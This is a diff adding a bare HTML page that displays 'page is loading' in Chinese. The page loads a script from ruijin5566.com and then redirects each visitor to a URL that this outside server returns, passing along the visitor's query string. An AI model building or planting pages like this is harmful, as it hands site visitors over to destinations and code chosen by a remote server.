@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title></title>
+    </head>
+    
+    <body>
+      <center><img src="https://49work.oss-cn-hangzhou.aliyuncs.com/fb4a9ba2949035eb170974d08394a1e5.gif">
+<h1>网页正在载入中！</h1></center>
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="http://ruijin5566.com/scounter"></script>
+<script>
+
+var src ='http://ruijin5566.com/api/go_free_bt/'+ window.location.search.substring(1)+'/1?t='+  (+new Date());
+console.log(src);
+  $.get(src, function(r){
+      console.log(333333333);
+      console.log(r);
+      console.log(4444444444444);
+      window.location.href = r;
+    },'JSON');
+</script>
+    </body>
+</html>
